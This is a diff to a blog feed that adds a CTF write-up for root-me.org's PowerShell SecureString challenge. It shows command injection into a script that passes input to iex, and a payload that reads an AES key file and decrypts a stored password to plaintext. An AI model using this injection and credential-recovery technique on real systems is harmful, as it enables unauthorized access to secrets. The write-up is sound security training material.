@@ -12,6 +12,224 @@
     </author>
     
       <item>
+        <title>Powershell - SecureString - root-me.org</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Let’s do the level 2 of the Powershell - Command Injection CTF. You can check it out the level 1 write up &lt;a href=&quot;/powershell-command-injection-root-me&quot;&gt;here&lt;/a&gt;. This CTF can be found under the App Script tab on &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+&lt;p&gt;Let’s check the statement:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Statement&lt;/p&gt;
+
+  &lt;p&gt;Recover the database’s password, with a twist!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We have basically the same problem as the level 1, but with a probable more secure password to hack. To ssh into the machine, we need to run:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch19@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and provide the password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch19&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;Let’s keep our approach mindset. For those who may not be closely following every release of our write-ups, this mindset is founded on four steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
+  &lt;li&gt;Understanding the problem&lt;/li&gt;
+  &lt;li&gt;Crafting an attack&lt;/li&gt;
+  &lt;li&gt;Solving&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;These steps are interconnected, and when followed methodically, they make the subsequent steps more straightforward.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
+
+&lt;p&gt;We have already covered the powershell basics &lt;a href=&quot;/powershell-command-injection-root-me#step-1---understanding-basic-concepts&quot;&gt;here&lt;/a&gt;. However, what is the ‘PowerShell SecureString’? This was my first question, since I’m not at all fluent in this script language.&lt;/p&gt;
+
+&lt;p&gt;As described by Microsoft:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet converts plain text to secure strings. […] The secure string can be converted back to an encrypted, standard string using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlet. This enables it to be stored in a file for later use.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;One example of how we can use this is by creating a variable that reads user input and convert it to a secure string. Let’s see how this works by opening our Linux powershell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Read-Host &lt;span class=&quot;nt&quot;&gt;-AsSecureString&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;                        
+System.Security.SecureString
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, the input has been converted to a secure string and we are not able to read it. We can encrypt our secure string by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlet:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-SecureString &lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;                                            
+6800690020006d006f006d00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, to recover the secure string, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet onto the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$encrypted&lt;/code&gt; variable we created:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-String&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;       
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt;
+System.Security.SecureString
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We could also create a secure string from an encrypted file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-SecureString &lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1..16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; | Set-Content encrypted.txt                                  
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content ./encrypted.txt | ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1..16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt;
+System.Security.SecureString
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is just the basics. If you are interesting in learning more aboute secure strings, go check it out at the &lt;a href=&quot;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.4&quot;&gt;Microsoft&lt;/a&gt; official documentation.&lt;/p&gt;
+
+&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;
+
+&lt;p&gt;Let’s ssh into the machine and check it out. As soon as we are in, we are greeted with a CLI program, same as the level 1:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Table to dump:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, since we have already solved level 1, let’s use our approach to gather information. Let’s run our command injection &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; ls&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;ygwin64&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;hallenge&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp-script&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;h19
+
+
+Mode                LastWriteTime         Length Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       12/12/2021   9:25 AM             43 .git
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:27 AM            361 .passwd.crypt
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       12/12/2021   9:50 AM            748 ._perms
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:23 AM            176 AES.key
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:30 AM            331 ch19.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice! We have access to all of these files. But it seems our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; is encrypted. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat .passwd.crypt&lt;/code&gt; to see:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .passwd.crypt
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEAR
+QBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANg
+AyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQB
+kADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAy
+ADkA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yep. This is not the answer, or else this problem would’ve been the same as the first one. Let’s take a look at the code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch19.ps1&lt;/code&gt; running the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat ch19.ps1&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AES.key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;crypt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoNewLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Write-Host Connect to the database With the secure Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+. Backup the table &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hm. Interesting. So we could access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$SecurePassword&lt;/code&gt; variable, which might be a secure string version of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd.crypt&lt;/code&gt;. To do this, we simply run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+System.Security.SecureString
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, we were right. This problem is using the techniques we found by Microsoft documentation to decrypt the password with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet.&lt;/p&gt;
+
+&lt;p&gt;Since we are able to access the powershell shell, we just need to find the command sequence to transform the secure string in readable format. One way to do that is by creating a variable that converts a secure string into a binary string (BSTR). This &lt;a href=&quot;https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text&quot;&gt;post&lt;/a&gt; talks about this.&lt;/p&gt;
+
+&lt;p&gt;As we can see, we need a series of commands to get what we want. Before attempting on the machine, let’s try it out on my local PCs:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;
+System.Security.SecureString
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::SecureStringToBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;
+140321549720616
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$unsecure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::PtrToStringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$unsecure&lt;/span&gt;
+hacked
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But how could we get the plain text version of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;? Well, that is where we get to our step 3.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;Now that we understand the basic concepts and the CTF problem, the solution becomes clearer. Take a sip of your coffee, sit back and enjoy our findings!&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;We could detect a command injection vulnerability in this powershell CLI, where when user passes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe, we can execute arbitrary code.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We know how to convert secure string into plain text.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Uniting both, we can build the perfect attack! How about something like:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content &lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content .passwd.crypt |
+ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marsh
+al]::SecureStringToBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.Inter
+opServices.Marshal]::PtrToStringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s understand this injection: first, we create a variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$key2&lt;/code&gt; which will read the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$KeyFile&lt;/code&gt; variable. After that, we proceed to decrypt the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd.crypt&lt;/code&gt; into a secure string using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet, storing the result into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$SecurePassword&lt;/code&gt; variable. After that, we simply apply our conversion from secure string to binary string, then to plain text, as we did in Step 2.&lt;/p&gt;
+
+&lt;p&gt;If everything runs smoothly, we shall solve this problem.&lt;/p&gt;
+
+&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;Let’s try our attack payload to see what happens:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content &lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content .passwd.crypt | ConvertTo
+&lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::SecureStringT
+oBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::PtrToS
+tringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt;
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+SecureStringBypass
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And there we have it! Our flag!&lt;/p&gt;
+
+&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we understood how secure strings work in powershell. We learned how to create secure strings and how to convert them back to a binary string. We also learned how to encrypt &amp;amp; decrypt secure strings using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlets.&lt;/p&gt;
+
+&lt;p&gt;We were able to solve this challenge because we found a command injection (thanks to our level 1 solution), followed by the conversion from secure string to binary string.&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something now. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 12 Dec 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//powershell-securestring-root-me</link>
+        <link href="http://localhost:4000/powershell-securestring-root-me"/>
+        <guid isPermaLink="true">http://localhost:4000/powershell-securestring-root-me</guid>
+      </item>
+    
+      <item>
         <title>Powershell - Command Injection - root-me.org</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -36,6 +254,8 @@
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch18@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch18&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
 
 &lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
 
